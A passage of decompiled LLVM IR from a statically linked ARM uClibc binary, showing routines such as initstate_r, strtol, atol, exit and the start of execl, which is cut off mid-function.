  uselistorder i32 %v2_13118, { 2, 1, 0 }
  uselistorder i32 %v0_1310825, { 1, 0 }
  uselistorder i32 %v0_130ec, { 1, 0, 2 }
  uselistorder i32 %v3_130e4, { 1, 0, 2 }
  uselistorder i32 %v3_130b4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_13168, { 1, 0 }
  uselistorder label %dec_label_pc_13154, { 1, 0 }
  uselistorder label %dec_label_pc_130f8, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13170:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13170 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13170, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_13170
  %v2_13170 = load i32, i32* @r7, align 4
  %v5_13170 = udiv i32 %v2_13170, 8
  %v6_13170 = and i32 %v5_13170, %arg1
  store i32 %v6_13170, i32* %r4.global-to-local, align 4
  %v2_13174 = load i32, i32* @sp, align 4
  %v8_13174 = shl i32 %v2_13174, %arg3
  %v9_13174 = and i32 %v8_13174, %arg2
  call void @__pseudo_branch(i32 %v9_13174)
  %v0_13178.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_13178 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_13178.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_13178 = load i32, i32* %r4.global-to-local, align 4
  %v3_13178 = load i32, i32* @fp, align 4
  %v8_13178 = shl i32 %v2_13178, %v3_13178
  %v9_13178 = and i32 %v8_13178, %v1_13178
  store i32 %v9_13178, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_13170, %bb
  %v10_13178 = phi i32 [ %arg1, %dec_label_pc_13170 ], [ %v9_13178, %bb ], [ %v1_13178, %.thread ]
  ret i32 %v10_13178

; uselistorder directives
  uselistorder i32 %v1_13178, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13180 = load i32, i32* @r4, align 4
  store i32 %v3_13180, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_131a0, label %dec_label_pc_13190

dec_label_pc_13190:                               ; preds = %entry
  %v2_13190 = icmp ugt i32 %arg2, 254
  %v7_13190 = icmp eq i32 %arg2, 255
  %v2_13194 = xor i1 %v7_13190, true
  %v3_13194 = and i1 %v2_13190, %v2_13194
  br i1 %v3_13194, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_13190
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_13190, %bb
  %v1_131c87 = phi i32 [ %v3_13180, %dec_label_pc_13190 ], [ 4, %bb ]
  %v2_13198 = xor i1 %v2_13190, true
  %v3_13198 = or i1 %v7_13190, %v2_13198
  br i1 %v3_13198, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_131a0:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_131b8, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_131a0
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13224

.thread10:                                        ; preds = %dec_label_pc_131a8
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131a0
  %v2_131b8 = icmp ugt i32 %arg2, 62
  %v7_131b8 = icmp eq i32 %arg2, 63
  %v2_131bc = xor i1 %v7_131b8, true
  %v3_131bc = and i1 %v2_131b8, %v2_131bc
  br i1 %v3_131bc, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_131b8
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_131b8, %bb22
  %v1_131c86 = phi i32 [ %v3_13180, %dec_label_pc_131b8 ], [ 2, %bb22 ]
  %v2_131c0 = xor i1 %v2_131b8, true
  %v3_131c0 = or i1 %v7_131b8, %v2_131c0
  br i1 %v3_131c0, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_131d0 = phi i32 [ 3, %bb21 ], [ %v1_131c87, %bb20 ], [ %v1_131c86, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1ac58.786 to i32), i32* %r2.global-to-local, align 4
  %v4_131c8 = mul i32 %v1_131d0, 4
  %v5_131c8 = add i32 %v4_131c8, ptrtoint (i32* @global_var_1ac58.786 to i32)
  store i32 %v5_131c8, i32* %r3.global-to-local, align 4
  %v1_131cc = add i32 %v4_131c8, add (i32 ptrtoint (i32* @global_var_1ac58.786 to i32), i32 20)
  %v2_131cc = inttoptr i32 %v1_131cc to i32*
  %v3_131cc = load i32, i32* %v2_131cc, align 4
  store i32 %v3_131cc, i32* %r1.global-to-local, align 4
  %v6_131d0 = inttoptr i32 %v5_131c8 to i32*
  %v7_131d0 = load i32, i32* %v6_131d0, align 4
  store i32 %v7_131d0, i32* %r2.global-to-local, align 4
  %v1_131d4 = add i32 %tmp, 4
  store i32 %v1_131d4, i32* @r6, align 4
  %v4_131d8 = mul i32 %v3_131cc, 4
  %v5_131d8 = add i32 %v4_131d8, %v1_131d4
  store i32 %v5_131d8, i32* %r3.global-to-local, align 4
  %v2_131dc = add i32 %arg3, 24
  %v3_131dc = inttoptr i32 %v2_131dc to i32*
  store i32 %v5_131d8, i32* %v3_131dc, align 4
  %v0_131e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_131e0 = load i32, i32* @r5, align 4
  %v2_131e0 = add i32 %v1_131e0, 20
  %v3_131e0 = inttoptr i32 %v2_131e0 to i32*
  store i32 %v0_131e0, i32* %v3_131e0, align 4
  %v0_131e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_131e4 = load i32, i32* @r5, align 4
  %v2_131e4 = add i32 %v1_131e4, 16
  %v3_131e4 = inttoptr i32 %v2_131e4 to i32*
  store i32 %v0_131e4, i32* %v3_131e4, align 4
  %v0_131e8 = load i32, i32* @r4, align 4
  %v1_131e8 = load i32, i32* @r5, align 4
  %v2_131e8 = add i32 %v1_131e8, 12
  %v3_131e8 = inttoptr i32 %v2_131e8 to i32*
  store i32 %v0_131e8, i32* %v3_131e8, align 4
  %v0_131ec = load i32, i32* @r6, align 4
  %v1_131ec = load i32, i32* @r5, align 4
  %v2_131ec = add i32 %v1_131ec, 8
  %v3_131ec = inttoptr i32 %v2_131ec to i32*
  store i32 %v0_131ec, i32* %v3_131ec, align 4
  %v0_131f0 = load i32, i32* @r5, align 4
  store i32 %v0_131f0, i32* %r1.global-to-local, align 4
  %v0_131f4 = load i32, i32* @r0, align 4
  %v2_131f4 = inttoptr i32 %v0_131f4 to i32*
  %v3_131f4 = call i32 @srandom_r(i32* %v2_131f4, i32 %v0_131f0)
  store i32 %v3_131f4, i32* %r0.global-to-local, align 4
  %v0_131f8 = load i32, i32* @r4, align 4
  %v2_131f8 = icmp eq i32 %v0_131f8, 0
  br i1 %v2_131f8, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1321412 = load i32, i32* @r7, align 4
  %v2_1321413 = inttoptr i32 %v1_1321412 to i32*
  store i32 0, i32* %v2_1321413, align 4
  %v1_13218 = load i32, i32* @r4, align 4
  store i32 %v1_13218, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_131fc = load i32, i32* @r5, align 4
  %v2_131fc = add i32 %v1_131fc, 4
  %v3_131fc = inttoptr i32 %v2_131fc to i32*
  %v4_131fc = load i32, i32* %v3_131fc, align 4
  %v1_13200 = load i32, i32* @r6, align 4
  %v3_13200 = sub i32 %v4_131fc, %v1_13200
  %v4_13204 = sdiv i32 %v3_13200, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1320c = mul i32 %v4_13204, 5
  %v5_1320c = add i32 %v4_1320c, %v0_131f8
  store i32 %v5_1320c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13214 = load i32, i32* @r7, align 4
  %v2_13214 = inttoptr i32 %v1_13214 to i32*
  store i32 0, i32* %v2_13214, align 4
  %v1_1321c = load i32, i32* %r3.global-to-local, align 4
  %v2_1321c = load i32, i32* @r7, align 4
  %v3_1321c = inttoptr i32 %v2_1321c to i32*
  store i32 %v1_1321c, i32* %v3_1321c, align 4
  %v17_13220.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_13220 = phi i32 [ %v1_13218, %bb26 ], [ %v17_13220.pre, %.thread4 ]
  %v2_13220 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13220, i32* %r4.global-to-local, align 4
  ret i32 %v17_13220

dec_label_pc_13224:                               ; preds = %dec_label_pc_131a8
  %v0_13224 = call i32 @__errno_location()
  store i32 %v0_13224, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1322c = inttoptr i32 %v0_13224 to i32*
  store i32 22, i32* %v2_1322c, align 4
  %v0_13230 = call i32 @__errno_location()
  %v0_13234 = load i32, i32* %r4.global-to-local, align 4
  %v2_13234 = inttoptr i32 %v0_13230 to i32*
  store i32 %v0_13234, i32* %v2_13234, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1323c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1323c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_131b8, { 1, 0 }
  uselistorder i1 %v7_13190, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1ac58.786 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ac58.786 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1324c = call i32 @strtol()
  ret i32 %v0_1324c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_13254 = call i32 @_stdlib_strto_l()
  ret i32 %v0_13254
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13258 = load i32, i32* @r4, align 4
  store i32 %v3_13258, i32* %stack_var_-36, align 4
  %v0_1325c = load i32, i32* @r1, align 4
  store i32 %v0_1325c, i32* %sb.global-to-local, align 4
  %v0_13260 = load i32, i32* @r2, align 4
  store i32 %v0_13260, i32* %r5.global-to-local, align 4
  %v0_13264 = load i32, i32* @r3, align 4
  store i32 %v0_13264, i32* %fp.global-to-local, align 4
  %v0_13268 = load i32, i32* @r0, align 4
  %v2_1327c.pre = load i32, i32* @global_var_23df4, align 4
  br label %dec_label_pc_13274

dec_label_pc_13274:                               ; preds = %dec_label_pc_13274, %entry
  %v0_132ac = phi i32 [ %v0_13268, %entry ], [ %v1_13270, %dec_label_pc_13274 ]
  store i32 %v0_132ac, i32* %r4.global-to-local, align 4
  %v1_13278 = inttoptr i32 %v0_132ac to i8*
  %v2_13278 = load i8, i8* %v1_13278, align 1
  %v3_13278 = zext i8 %v2_13278 to i32
  store i32 %v3_13278, i32* @r2, align 4
  %v3_13280 = mul nuw nsw i32 %v3_13278, 2
  %v4_13280 = add i32 %v3_13280, %v2_1327c.pre
  %v5_13280 = inttoptr i32 %v4_13280 to i8*
  %v6_13280 = load i8, i8* %v5_13280, align 1
  %v1_13284 = and i8 %v6_13280, 32
  %v2_13284 = icmp eq i8 %v1_13284, 0
  %v1_13270 = add i32 %v0_132ac, 1
  br i1 %v2_13284, label %dec_label_pc_1328c, label %dec_label_pc_13274

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13274
  %v7_1328c = icmp eq i8 %v2_13278, 43
  br i1 %v7_1328c, label %dec_label_pc_132ac, label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %dec_label_pc_1328c
  %v7_13294 = icmp eq i8 %v2_13278, 45
  br i1 %v7_13294, label %dec_label_pc_132ac, label %bb

bb:                                               ; preds = %dec_label_pc_13294
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132ac:                               ; preds = %dec_label_pc_1328c, %dec_label_pc_13294
  %storemerge43 = phi i32 [ 1, %dec_label_pc_13294 ], [ 0, %dec_label_pc_1328c ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_13270, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %bb, %dec_label_pc_132ac
  %v0_132d0 = phi i32 [ %v0_132ac, %bb ], [ %v1_13270, %dec_label_pc_132ac ]
  %v1_132b0 = and i32 %v0_13260, -17
  %v3_132b0 = icmp eq i32 %v1_132b0, 0
  br i1 %v3_132b0, label %dec_label_pc_132bc, label %bb54

bb54:                                             ; preds = %dec_label_pc_132b0
  br label %bb58

dec_label_pc_132bc:                               ; preds = %dec_label_pc_132b0
  %v1_132bc = inttoptr i32 %v0_132d0 to i8*
  %v2_132bc = load i8, i8* %v1_132bc, align 1
  %v7_132c0 = icmp eq i8 %v2_132bc, 48
  %v1_132c4 = add i32 %v0_13260, 10
  store i32 %v1_132c4, i32* %r5.global-to-local, align 4
  br i1 %v7_132c0, label %dec_label_pc_132d0, label %bb55

bb55:                                             ; preds = %dec_label_pc_132bc
  br label %.thread8

dec_label_pc_132d0:                               ; preds = %dec_label_pc_132bc
  %v1_132d0 = add i32 %v0_132d0, 1
  %v2_132d0 = inttoptr i32 %v1_132d0 to i8*
  %v3_132d0 = load i8, i8* %v2_132d0, align 1
  %v4_132d0 = zext i8 %v3_132d0 to i32
  store i32 %v1_132d0, i32* %r4.global-to-local, align 4
  %v1_132d4 = or i32 %v4_132d0, 32
  %v7_132d8 = icmp eq i32 %v1_132d4, 120
  %v1_132dc = add i32 %v0_13260, 8
  store i32 %v1_132dc, i32* %r5.global-to-local, align 4
  br i1 %v7_132d8, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_132d0
  %v3_132e8 = mul i32 %v1_132dc, 2
  store i32 %v3_132e8, i32* %r5.global-to-local, align 4
  %v2_132ec = add i32 %v0_132d0, 2
  store i32 %v2_132ec, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_132d0, %bb55, %bb56
  %v1_133b028 = phi i32 [ %v0_13268, %bb55 ], [ %v1_132d0, %bb56 ], [ %v1_132d0, %dec_label_pc_132d0 ]
  %v0_1333819 = phi i32 [ %v0_132d0, %bb55 ], [ %v2_132ec, %bb56 ], [ %v1_132d0, %dec_label_pc_132d0 ]
  %v0_132f0 = phi i32 [ %v1_132c4, %bb55 ], [ %v3_132e8, %bb56 ], [ %v1_132dc, %dec_label_pc_132d0 ]
  %v5_132f4 = icmp slt i32 %v0_132f0, 16
  br i1 %v5_132f4, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_133b027 = phi i32 [ %v0_13268, %bb54 ], [ %v1_133b028, %.thread8 ], [ %v1_133b028, %bb57 ]
  %v0_1333818 = phi i32 [ %v0_132d0, %bb54 ], [ %v0_1333819, %.thread8 ], [ %v0_1333819, %bb57 ]
  %v0_13308 = phi i32 [ %v0_13260, %bb54 ], [ %v0_132f0, %.thread8 ], [ 16, %bb57 ]
  %v1_132f8 = add i32 %v0_13308, -2
  %tmp = icmp ugt i32 %v1_132f8, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13308

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_133ac

dec_label_pc_13308:                               ; preds = %bb58
  %v2_13310 = urem i32 -1, %v0_13308
  %v1_13320 = urem i32 %v2_13310, 256
  store i32 %v1_13320, i32* %sl.global-to-local, align 4
  %v2_13324 = udiv i32 -1, %v0_13308
  store i32 0, i32* @ip, align 4
  store i32 %v2_13324, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13338

dec_label_pc_13334:                               ; preds = %bb65, %dec_label_pc_13394
  %v0_13334 = phi i32 [ %v1_13364, %bb65 ], [ %v0_13334.pre, %dec_label_pc_13394 ]
  br label %dec_label_pc_13338

dec_label_pc_13338:                               ; preds = %dec_label_pc_13308, %dec_label_pc_13334
  %v1_133b025 = phi i32 [ %v1_133b027, %dec_label_pc_13308 ], [ %v0_13334, %dec_label_pc_13334 ]
  %v0_13364 = phi i32 [ %v0_1333818, %dec_label_pc_13308 ], [ %v0_13334, %dec_label_pc_13334 ]
  %v1_13338 = inttoptr i32 %v0_13364 to i8*
  %v2_13338 = load i8, i8* %v1_13338, align 1
  %v3_13338 = zext i8 %v2_13338 to i32
  %v1_1333c = add nsw i32 %v3_13338, -48
  %v1_13340 = urem i32 %v1_1333c, 256
  %v1_13348 = or i32 %v3_13338, 32
  store i32 %v1_13348, i32* @r2, align 4
  %tmp73 = icmp ult i32 %v1_13340, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_13350

dec_label_pc_13350:                               ; preds = %dec_label_pc_13338
  %v1_13354 = add nsw i32 %v1_13348, -87
  store i32 %v1_13354, i32* @r2, align 4
  %tmp74 = icmp ugt i32 %v1_13348, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_13350
  %v5_1335c = urem i32 %v1_13354, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_13338, %dec_label_pc_13350, %bb59
  %v3_1338c = phi i32 [ %v1_13340, %dec_label_pc_13338 ], [ 40, %dec_label_pc_13350 ], [ %v5_1335c, %bb59 ]
  %v1_13360 = load i32, i32* %r5.global-to-local, align 4
  %v1_13364 = add i32 %v0_13364, 1
  store i32 %v1_13364, i32* %r4.global-to-local, align 4
  %v6_13368 = icmp slt i32 %v3_1338c, %v1_13360
  br i1 %v6_13368, label %dec_label_pc_1336c, label %dec_label_pc_133ac.loopexit

dec_label_pc_1336c:                               ; preds = %bb60
  %v0_1336c = load i32, i32* @ip, align 4
  %v1_1336c = load i32, i32* %r8.global-to-local, align 4
  %v9_1336c = icmp eq i32 %v0_1336c, %v1_1336c
  br i1 %v9_1336c, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_1336c
  br label %dec_label_pc_1337c

bb61:                                             ; preds = %dec_label_pc_1336c
  %v3_1336c = icmp ult i32 %v0_1336c, %v1_1336c
  br i1 %v3_1336c, label %dec_label_pc_1337c, label %dec_label_pc_13394

dec_label_pc_1337c:                               ; preds = %bb61, %.thread37
  %v4_133842240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_1337c = load i32, i32* %sl.global-to-local, align 4
  %v3_1337c = icmp uge i32 %v3_1338c, %v1_1337c
  %v9_1337c = icmp eq i32 %v3_1338c, %v1_1337c
  %v2_13380 = xor i1 %v3_1337c, true
  %v3_13380 = or i1 %v9_1337c, %v2_13380
  br i1 %v3_13380, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1337c
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_1337c, %bb62
  %v4_13384 = phi i32 [ %v4_133842240, %dec_label_pc_1337c ], [ 0, %bb62 ]
  %v2_13384 = xor i1 %v9_1337c, true
  %v3_13384 = and i1 %v3_1337c, %v2_13384
  br i1 %v3_13384, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_13384 = urem i32 %v4_13384, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_13388 = phi i32 [ %v5_13384, %bb64 ], [ %v4_13384, %bb63 ]
  %v2_13388 = icmp eq i32 %v0_13388, 0
  br i1 %v2_13388, label %bb65, label %dec_label_pc_13394

bb65:                                             ; preds = %thread-pre-split
  %v4_1338c = mul i32 %v0_1336c, %v1_13360
  %v5_1338c = add i32 %v4_1338c, %v3_1338c
  store i32 %v5_1338c, i32* @ip, align 4
  br label %dec_label_pc_13334

dec_label_pc_13394:                               ; preds = %bb61, %thread-pre-split
  %v0_13394 = call i32 @__errno_location()
  %v0_13398 = load i32, i32* %r7.global-to-local, align 4
  %v1_13398 = load i32, i32* %fp.global-to-local, align 4
  %v2_13398 = and i32 %v1_13398, %v0_13398
  store i32 %v2_13398, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_133a4 = inttoptr i32 %v0_13394 to i32*
  store i32 34, i32* %v2_133a4, align 4
  %v0_13334.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13334

dec_label_pc_133ac.loopexit:                      ; preds = %bb60
  %v0_133ac.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_133ac

dec_label_pc_133ac:                               ; preds = %.thread, %dec_label_pc_133ac.loopexit
  %v1_133b0 = phi i32 [ %v1_133b025, %dec_label_pc_133ac.loopexit ], [ %v1_133b027, %.thread ]
  %v2_133b0 = phi i32 [ %v0_133ac.pre, %dec_label_pc_133ac.loopexit ], [ %v0_1325c, %.thread ]
  %v2_133ac = icmp eq i32 %v2_133b0, 0
  br i1 %v2_133ac, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_133ac
  %v3_133b0 = inttoptr i32 %v2_133b0 to i32*
  store i32 %v1_133b0, i32* %v3_133b0, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_133ac, %bb66
  %v0_133b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_133b4 = icmp eq i32 %v0_133b4, 0
  %. = select i1 %v2_133b4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_133c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_133c0 = icmp eq i32 %v0_133c0, 0
  %v0_133e4.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_133c0, label %dec_label_pc_133dc, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_133e4.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_133cc, label %dec_label_pc_133dc

dec_label_pc_133cc:                               ; preds = %bb70
  %v0_133cc = call i32 @__errno_location()
  %v2_133d4 = inttoptr i32 %v0_133cc to i32*
  store i32 34, i32* %v2_133d4, align 4
  %v0_133d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_133d8, i32* @ip, align 4
  %v0_133dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_133dc

dec_label_pc_133dc:                               ; preds = %bb70, %bb67, %dec_label_pc_133cc
  %v0_133e4.pre = phi i32 [ %v0_133e4.pre.pre, %bb70 ], [ %v0_133d8, %dec_label_pc_133cc ], [ %v0_133e4.pre.pre, %bb67 ]
  %v0_133dc = phi i32 [ %v0_133b4, %bb70 ], [ %v0_133dc.pre, %dec_label_pc_133cc ], [ %v0_133b4, %bb67 ]
  %v2_133dc = icmp eq i32 %v0_133dc, 0
  br i1 %v2_133dc, label %dec_label_pc_133dc._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_133dc
  %v2_133e0 = sub i32 0, %v0_133e4.pre
  store i32 %v2_133e0, i32* @ip, align 4
  br label %dec_label_pc_133dc._crit_edge

dec_label_pc_133dc._crit_edge:                    ; preds = %dec_label_pc_133dc, %bb71
  %v0_133e4 = phi i32 [ %v2_133e0, %bb71 ], [ %v0_133e4.pre, %dec_label_pc_133dc ]
  %v2_133e8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_133e8, i32* @r4, align 4
  ret i32 %v0_133e4

; uselistorder directives
  uselistorder i32 %v0_133e4.pre, { 1, 0 }
  uselistorder i32 %v0_133e4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_13384, { 1, 0 }
  uselistorder i1 %v3_1337c, { 1, 0 }
  uselistorder i32 %v1_1337c, { 1, 0 }
  uselistorder i32 %v1_13364, { 1, 0 }
  uselistorder i32 %v1_13340, { 1, 0 }
  uselistorder i32 %v0_13334, { 1, 0 }
  uselistorder i32 %v0_13308, { 1, 0, 2 }
  uselistorder i32 %v3_132e8, { 1, 0 }
  uselistorder i32 %v1_132dc, { 1, 0, 2 }
  uselistorder i32 %v0_132d0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_13270, { 1, 0, 2 }
  uselistorder i32 %v0_13268, { 1, 0, 2 }
  uselistorder i32 %v0_13260, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_133dc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_133dc, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_133ac, { 1, 0 }
  uselistorder label %dec_label_pc_13394, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13338, { 1, 0 }
  uselistorder label %dec_label_pc_13334, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_132b0, { 1, 0 }
  uselistorder label %dec_label_pc_132ac, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_133f0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_133f0, i32* @r0, align 4
  %v1_1340c = call i32 @__pthread_return_void()
  %v1_1341c = call i32 @__pthread_return_0()
  %v2_13424 = load i32, i32* @global_var_2a3ac.799, align 4
  %v2_13428 = icmp eq i32 %v2_13424, 0
  br i1 %v2_13428, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_13424)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_133f0, i32* @r0, align 4
  %v1_13448 = call i32 @__pthread_return_void()
  store i32 %v1_13448, i32* @r0, align 4
  %v1_1344c = call i32 @__GI___uClibc_fini(i32 %v1_13448)
  store i32 78944, i32* @lr, align 4
  %v2_1345c = call i32 @_stdio_term()
  %v0_13460 = load i32, i32* @r4, align 4
  %v1_13464 = call i32 @__GI__exit(i32 %v0_13460)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_13484 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_13484, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_13494 = ptrtoint i32* %stack_var_-32 to i32
  %v2_13498 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_13498, i32* %stack_var_-32, align 4
  br label %dec_label_pc_134a4

dec_label_pc_134a4:                               ; preds = %dec_label_pc_134a4, %entry
